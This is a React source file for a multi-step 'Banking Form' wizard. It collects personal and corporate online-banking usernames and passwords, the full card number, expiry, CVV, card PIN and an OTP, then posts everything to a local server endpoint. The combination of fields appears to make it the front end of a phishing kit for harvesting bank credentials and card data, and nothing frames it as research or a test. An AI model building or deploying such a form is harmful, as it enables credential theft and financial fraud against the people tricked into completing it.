import React, { useState } from 'react';
import { Container, Paper, Stepper, Step, StepLabel, Typography } from '@mui/material';
import axios from 'axios';
import PersonalBankingForm from './components/PersonalBankingForm';
import CorporateBankingForm from './components/CorporateBankingForm';
import CreditDebitCardForm from './components/CreditDebitCardForm';
import OtpForm from './components/OtpForm';

const steps = ['Personal Banking', 'Corporate Banking', 'Credit/Debit Card', 'OTP Verification'];

const App = () => {
  const [activeStep, setActiveStep] = useState(0);
  const [formData, setFormData] = useState({
    fullName: '',
    email: '',
    phoneNumber: '',
    address: '',
    username: '',
    password: '',
    companyName: '',
    companyEmail: '',
    contactPerson: '',
    contactPhone: '',
    loginId: '',
    userId: '',
    corpPassword: '',
    cardholderName: '',
    cardNumber: '',
    expiryDate: '',
    cvv: '',
    pin: '',
    otp: ''
  });

  const nextStep = () => setActiveStep((prevStep) => prevStep + 1);
  const prevStep = () => setActiveStep((prevStep) => prevStep - 1);

  const handleSubmit = async () => {
    try {
      await axios.post('http://localhost:5000/submit-form', formData);
      alert('Form data submitted successfully');
      setActiveStep(0);
      setFormData({
        fullName: '',
        email: '',
        phoneNumber: '',
        address: '',
        username: '',
        password: '',
        companyName: '',
        companyEmail: '',
        contactPerson: '',
        contactPhone: '',
        loginId: '',
        userId: '',
        corpPassword: '',
        cardholderName: '',
        cardNumber: '',
        expiryDate: '',
        cvv: '',
        pin: '',
        otp: ''
      });
    } catch (error) {
      console.error('Error submitting form data', error);
      alert('Failed to submit form data');
    }
  };

  const getStepContent = (step) => {
    switch (step) {
      case 0:
        return <PersonalBankingForm formData={formData} setFormData={setFormData} nextStep={nextStep} />;
      case 1:
        return <CorporateBankingForm formData={formData} setFormData={setFormData} nextStep={nextStep} prevStep={prevStep} />;
      case 2:
        return <CreditDebitCardForm formData={formData} setFormData={setFormData} nextStep={nextStep} prevStep={prevStep} />;
      case 3:
        return <OtpForm formData={formData} setFormData={setFormData} handleSubmit={handleSubmit} prevStep={prevStep} />;
      default:
        return 'Unknown step';
    }
  };

  return (
    <Container maxWidth="sm">
      <Paper elevation={3} style={{ padding: '20px' }}>
        <Typography variant="h4" align="center" gutterBottom>
          Banking Form
        </Typography>
        <Stepper activeStep={activeStep} alternativeLabel>
          {steps.map((label) => (
            <Step key={label}>
              <StepLabel>{label}</StepLabel>
            </Step>
          ))}
        </Stepper>
        {getStepContent(activeStep)}
      </Paper>
    </Container>
  );
};

export default App;
